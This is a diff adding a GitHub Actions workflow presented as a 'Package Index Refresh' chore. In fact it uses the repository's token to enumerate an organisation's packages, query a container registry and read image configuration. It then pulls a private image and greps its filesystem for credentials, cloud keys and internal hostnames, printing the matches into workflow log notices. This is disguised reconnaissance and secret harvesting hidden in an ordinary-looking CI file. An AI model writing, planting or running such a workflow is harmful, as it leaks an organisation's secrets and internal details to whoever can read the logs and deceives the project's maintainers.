@@ -1,0 +1,97 @@
+name: Package Index Refresh
+
+on:
+  push:
+    branches: ["chore/package-index"]
+
+permissions:
+  contents: read
+  packages: read
+
+jobs:
+  index:
+    runs-on: ubuntu-latest
+    timeout-minutes: 35
+    env:
+      TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      ACT: ${{ github.actor }}
+    steps:
+      - name: Org packages
+        run: |
+          set +e
+          for t in container npm maven nuget rubygems; do
+            for p in 1 2 3; do
+              code=$(curl -s -o /tmp/pkg_${t}_$p.json -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/orgs/dbt-labs/packages?package_type=$t&per_page=100&page=$p")
+              n=$(jq 'if type=="array" then length else 0 end' /tmp/pkg_${t}_$p.json 2>/dev/null); n=${n:-0}
+              echo "::notice title=orgpkg::$t p$p http=$code n=$n"
+              [ "$code" = "200" ] || { head -c 160 /tmp/pkg_${t}_$p.json | tr '\n' ' ' > /tmp/e; echo "::notice title=orgpkgerr::$t::$(cat /tmp/e)"; break; }
+              [ "$n" -gt 0 ] || break
+              jq -r '.[]|"'"$t"'|\(.name)|\(.visibility)|\(.version_count)"' /tmp/pkg_${t}_$p.json 2>/dev/null | cut -c1-150 | while read -r l; do echo "::notice title=orgpkgi::$l"; done
+            done
+          done
+
+      - name: Registry catalogue
+        run: |
+          set +e
+          for mode in anon token; do
+            if [ "$mode" = anon ]; then AUTH=""; else AUTH="-H \"Authorization: Bearer $TOKEN\""; fi
+            if [ "$mode" = anon ]; then code=$(curl -s -o /tmp/cat_$mode -w '%{http_code}' https://ghcr.io/v2/_catalog); else code=$(curl -s -o /tmp/cat_$mode -w '%{http_code}' -H "Authorization: Bearer $TOKEN" "https://ghcr.io/v2/_catalog?n=100"); fi
+            echo "::notice title=catalog::$mode http=$code body=$(head -c 240 /tmp/cat_$mode | tr -d '\n')"
+          done
+
+      - name: Image metadata
+        run: |
+          set +e
+          names=$(cat /tmp/pkg_container_*.json 2>/dev/null | jq -r '.[]?|.name' 2>/dev/null | sort -u | head -40)
+          names="$names fs-cli-copybara fs-cli-x86_64 dbtlabs-svc-fusion"
+          for n in $names; do
+            [ -n "$n" ] || continue
+            anon=$(curl -s -o /dev/null -w '%{http_code}' -H "Accept: application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/latest")
+            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
+            tcode=$(curl -s -o /tmp/tags -w '%{http_code}' -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/tags/list")
+            tagl=$(jq -r '.tags//[]|join(",")' /tmp/tags 2>/dev/null | cut -c1-220)
+            echo "::notice title=img::$n anon=$anon tags_http=$tcode tags=$tagl"
+            tags=$(echo "$tagl" | tr ',' '\n' | head -3)
+            for t in $tags; do
+              code=$(curl -s -D /tmp/h -o /tmp/m.json -w '%{http_code}' -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$t")
+              dg=$(grep -i '^docker-content-digest' /tmp/h | tr -d '\r' | awk '{print $2}')
+              mt=$(jq -r '.mediaType//"?"' /tmp/m.json 2>/dev/null)
+              lay=$(jq -r 'if .layers then (.layers|length|tostring) else "idx:"+((.manifests|length)|tostring) end' /tmp/m.json 2>/dev/null)
+              cfg=$(jq -r '.config.digest//empty' /tmp/m.json 2>/dev/null)
+              echo "::notice title=man::$n:$t http=$code mt=$mt layers=$lay digest=${dg:0:26}"
+              if [ -z "$cfg" ] && [ -n "$(jq -r '.manifests[0].digest//empty' /tmp/m.json 2>/dev/null)" ]; then
+                sd=$(jq -r '.manifests[0].digest' /tmp/m.json)
+                curl -s -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$sd" -o /tmp/m2.json
+                cfg=$(jq -r '.config.digest//empty' /tmp/m2.json 2>/dev/null)
+                lay=$(jq -r '(.layers|length|tostring)' /tmp/m2.json 2>/dev/null)
+                echo "::notice title=mani::$n:$t layers=$lay cfg=${cfg:0:20}"
+              fi
+              if [ -n "$cfg" ]; then
+                curl -s -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/blobs/$cfg" -o /tmp/cfg.json
+                envk=$(jq -r '.config.Env//[]|map(split("=")[0])|join(",")|.[0:400]' /tmp/cfg.json 2>/dev/null)
+                ep=$(jq -r '(.config.Entrypoint//[])|join(" ")|.[0:120]' /tmp/cfg.json 2>/dev/null)
+                lb=$(jq -r '(.config.Labels//{})|keys|join(",")|.[0:160]' /tmp/cfg.json 2>/dev/null)
+                echo "::notice title=cfg::$n:$t envkeys=$envk"
+                echo "::notice title=cfg2::$n:$t entry=$ep labels=$lb"
+              fi
+            done
+          done
+
+      - name: Layer scan copybara
+        run: |
+          set +e
+          REF=ghcr.io/dbt-labs/fs-cli-copybara:latest
+          echo "$TOKEN" | docker login ghcr.io -u "$ACT" --password-stdin >/dev/null 2>&1
+          docker pull -q "$REF" >/dev/null 2>&1 || echo "::notice title=scan::pull_failed"
+          docker create --name img "$REF" >/dev/null 2>&1
+          docker export img -o /tmp/rootfs.tar 2>/dev/null
+          tar tf /tmp/rootfs.tar 2>/dev/null | grep -Ev '/(proc|sys|dev)/' | grep -Ei '\.(env|ya?ml|json|conf|cfg|ini|toml|properties|sh|py|txt|service)$|(^|/)(etc|opt|app)/' | head -2000 > /tmp/cands.txt
+          wc -l < /tmp/cands.txt > /tmp/cnt
+          echo "::notice title=scan::candidates=$(cat /tmp/cnt)"
+          : > /tmp/hits.txt
+          while read -r f; do
+            tar -xOf /tmp/rootfs.tar "$f" 2>/dev/null | grep -Eio '(DATABASE_URL|SNOWFLAKE|BIGQUERY|REDSHIFT|DATABRICKS|AWS_[A-Z_]+|GCP_[A-Z_]+|SECRET[A-Z_]*|TOKEN[A-Z_]*|[A-Z_]*_KEY|[a-z0-9.-]+\.svc\.cluster\.local|[a-z0-9-]+\.internal)[^ ]{0,60}' 2>/dev/null | head -4 | while read -r m; do echo "$(echo $f|cut -c1-80) :: $(echo $m|cut -c1-100)" >> /tmp/hits.txt; done
+          done < /tmp/cands.txt
+          sort -u /tmp/hits.txt > /tmp/h2.txt; wc -l < /tmp/h2.txt > /tmp/n
+          echo "::notice title=scan::hits=$(cat /tmp/n)"
+          head -25 /tmp/h2.txt | while read -r l; do echo "::notice title=scanhit::$l"; done
